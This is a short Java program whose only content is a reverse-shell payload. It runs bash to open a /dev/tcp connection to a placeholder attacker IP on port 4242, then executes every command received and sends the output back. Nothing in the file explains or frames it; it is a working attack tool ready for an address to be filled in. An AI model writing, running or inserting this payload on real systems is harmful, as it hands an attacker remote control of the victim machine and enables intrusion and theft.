class Simple{  
    public static void main(String args[]){  

		Runtime r = Runtime.getRuntime();
		String[] payload = {"/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKING IP>/4242;cat <&5 | while read line; do $line 2>&5 >&5; done"};

		try{
			Process p = r.exec(payload);
			p.waitFor();

		}catch(Exception e){
			System.out.println("Exception occurred");
		}

	}
}